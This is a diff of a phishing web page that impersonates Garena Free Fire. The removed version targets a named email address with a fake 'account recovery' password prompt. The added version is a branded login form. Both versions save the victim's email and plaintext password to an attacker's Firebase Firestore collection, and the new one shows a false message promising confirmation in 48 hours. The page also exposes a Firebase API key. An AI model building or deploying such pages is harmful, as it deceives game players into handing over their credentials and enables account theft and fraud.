@@ -1,161 +1,156 @@
-<!DOCTYPE html>
+<!DOCTYPE html><!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Confirm Free Fire Account</title>
+  <title>Login Page</title>
 
-  <!-- Favicon from imgbb -->
-  <link rel="icon" type="image/png" href="https://i.ibb.co/LXXGHhZg/garena.png">
-
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
 
   <style>
-    /* Reset */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: Arial, sans-serif;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
 
     body {
+      font-family: Arial, sans-serif;
+      height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
-      background: linear-gradient(135deg, #1e1e2f, #121212);
-      color: white;
+      position: relative;
+      overflow: hidden;
     }
 
-    .card {
-      width: 100%;
-      max-width: 400px;
-      background: #1f1f2f;
-      padding: 2rem;
-      border-radius: 1rem;
-      box-shadow: 0 6px 20px rgba(0,0,0,0.5);
+    /* Background */
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: url("https://i.ibb.co/Qj833qRN/Garena-Free-Fire-MAX-redeem-codes-July-27.jpg") no-repeat center center/cover;
+      filter: brightness(0.4) blur(4px);
+      z-index: -1;
+    }
+
+    .login-box {
+      background: rgba(0, 0, 0, 0.65);
+      padding: 25px;
+      border-radius: 15px;
+      max-width: 350px;
+      width: 90%;
       text-align: center;
+      color: #fff;
+      backdrop-filter: blur(3px);
+      border: 2px solid #ffcc00;
+      box-shadow: 0 0 10px #ffcc00, 0 0 20px #ffb300, 0 0 30px #ff9900;
+      animation: neonPulse 2s infinite alternate;
     }
 
-    h2 {
-      font-size: 1.1rem;
-      margin-bottom: 1.5rem;
-      color: #00ffe0;
+    @keyframes neonPulse {
+      from {
+        box-shadow: 0 0 10px #ffcc00, 0 0 20px #ffb300, 0 0 30px #ff9900;
+      }
+      to {
+        box-shadow: 0 0 20px #ffcc00, 0 0 40px #ffb300, 0 0 60px #ff9900;
+      }
     }
 
-    .input-group {
-      margin-bottom: 1.2rem;
-      text-align: left;
+    .login-box img {
+      width: 70px;
+      margin-bottom: 12px;
     }
 
-    label {
-      font-size: 0.9rem;
-      color: #bbb;
-      display: block;
-      margin-bottom: 0.3rem;
-    }
+    h2 { font-size: 1.3rem; margin-bottom: 10px; }
+    p { font-size: 0.9rem; margin-bottom: 15px; color: #ccc; }
 
     input {
       width: 100%;
-      padding: 0.8rem;
-      border: none;
-      border-radius: 0.6rem;
-      background: #2c2c3c;
-      color: white;
+      padding: 12px;
+      margin: 8px 0;
+      border-radius: 8px;
+      border: 2px solid #444;
+      outline: none;
       font-size: 1rem;
+      background: #111;
+      color: #fff;
+      transition: 0.3s;
     }
 
-    input::placeholder {
-      color: #aaa;
+    /* Neon glow on focus */
+    input:focus {
+      border-color: #ffcc00;
+      box-shadow: 0 0 10px #ffcc00, 0 0 20px #ffb300;
     }
 
     button {
+      padding: 12px;
       width: 100%;
-      padding: 0.9rem;
+      background: #ffcc00;
       border: none;
-      border-radius: 0.6rem;
-      background: linear-gradient(135deg, #00ffe0, #00b3ff);
+      border-radius: 8px;
       color: black;
       font-size: 1rem;
       font-weight: bold;
       cursor: pointer;
-      transition: transform 0.2s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 8px #ffcc00;
     }
 
-    button:hover:enabled {
-      transform: scale(1.03);
+    button:hover {
+      background: #ffb300;
+      transform: scale(1.05);
+      box-shadow: 0 0 15px #ffcc00, 0 0 30px #ffb300, 0 0 45px #ff9900;
     }
 
-    button:disabled {
-      opacity: 0.7;
-      cursor: not-allowed;
+    /* Popup message */
+    .popup {
+      position: fixed;
+      top: -80px; /* hidden above screen */
+      left: 50%;
+      transform: translateX(-50%);
+      background: #ffcc00;
+      color: black;
+      padding: 12px 20px;
+      border-radius: 8px;
+      font-weight: bold;
+      box-shadow: 0 0 15px #ffcc00;
+      opacity: 0;
+      transition: all 0.6s ease;
+      z-index: 1000;
     }
 
-    .spinner {
-      width: 16px;
-      height: 16px;
-      border: 2px solid rgba(0,0,0,0.2);
-      border-top: 2px solid black;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .footer {
-      margin-top: 1rem;
-      font-size: 0.8rem;
-      color: #777;
+    .popup.show {
+      top: 20px;
+      opacity: 1;
     }
 
     @media (max-width: 480px) {
-      .card {
-        padding: 1.5rem;
-      }
-      h2 {
-        font-size: 1rem;
-      }
-      input, button {
-        font-size: 0.9rem;
-        padding: 0.75rem;
-      }
+      .login-box { padding: 20px; }
+      .login-box img { width: 55px; }
+      h2 { font-size: 1.1rem; }
+      p { font-size: 0.85rem; }
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Dear inshoking2@gmail.com,<br>please enter your password to confirm it’s you recovering your Free Fire account.</h2>
+  <div class="login-box">
+    <img src="https://i.ibb.co/LXXGHhZg/garena.png" alt="Garena Logo">
+    <h2>Dear ✿ᎪᏆᎦᎻᎪᏫᎮ乂</h2>
+    <p>Please enter your email & password to continue</p>
     <form id="loginForm">
-      <div class="input-group">
-        <label for="email">Email</label>
-        <input type="email" id="email" value="inshoking2@gmail.com" readonly>
-      </div>
-      <div class="input-group">
-        <label for="password">Password</label>
-        <input type="password" id="password" placeholder="Enter your password" required>
-      </div>
-      <button type="submit" id="submitBtn">
-        <span id="btnText">Confirm</span>
-        <div class="spinner" id="spinner" style="display:none;"></div>
-      </button>
+      <input type="email" id="email" placeholder="Enter your email" required>
+      <input type="password" id="password" placeholder="Enter your password" required>
+      <button type="submit">Login</button>
     </form>
-    <div class="footer">
-      Secure verification powered by Garena
-    </div>
   </div>
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+  <!-- Popup -->
+  <div id="popup" class="popup">
+    You will receive confirmation at your email in 48 hours
+  </div>
 
-    // 🔑 Your Firebase config
+  <script>
+    // ✅ Your Firebase config
     const firebaseConfig = {
       apiKey: "AIzaSyCXJiBXLNVnk0TSigI2bDA9kG4MgrXEQ40",
       authDomain: "my-store-a881a.firebaseapp.com",
@@ -166,45 +161,38 @@
       measurementId: "G-FLDGL3JF38"
     };
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+    // ✅ Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
 
-    async function saveUser(email, password) {
-      try {
-        const docRef = await addDoc(collection(db, "users"), {
-          email: email,
-          password: password  // ⚠️ Plaintext for learning only
-        });
-        alert("✅ Saved with ID: " + docRef.id);
-      } catch (e) {
-        console.error("❌ Error adding document: ", e);
-        alert("Error: " + e.message);
-      }
-    }
-
+    // ✅ Handle form submit
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
       e.preventDefault();
+
       const email = document.getElementById("email").value;
-      const pass = document.getElementById("password").value;
-      const btn = document.getElementById("submitBtn");
-      const spinner = document.getElementById("spinner");
-      const btnText = document.getElementById("btnText");
+      const password = document.getElementById("password").value;
 
-      // Show spinner
-      btn.disabled = true;
-      spinner.style.display = "block";
-      btnText.textContent = "Saving...";
+      try {
+        await db.collection("users").add({
+          email: email,
+          password: password,
+          timestamp: firebase.firestore.FieldValue.serverTimestamp()
+        });
 
-      await saveUser(email, pass);
+        // ✅ Show popup with slide animation
+        const popup = document.getElementById("popup");
+        popup.classList.add("show");
+        setTimeout(() => { popup.classList.remove("show"); }, 5000);
 
-      // Reset button
-      spinner.style.display = "none";
-      btnText.textContent = "Confirm";
-      btn.disabled = false;
+        // Reset form
+        document.getElementById("loginForm").reset();
+      } catch (error) {
+        console.error("❌ Error adding document: ", error);
+        alert("Error: " + error.message);
+      }
     });
   </script>
 </body>
 </html>
-
 
 
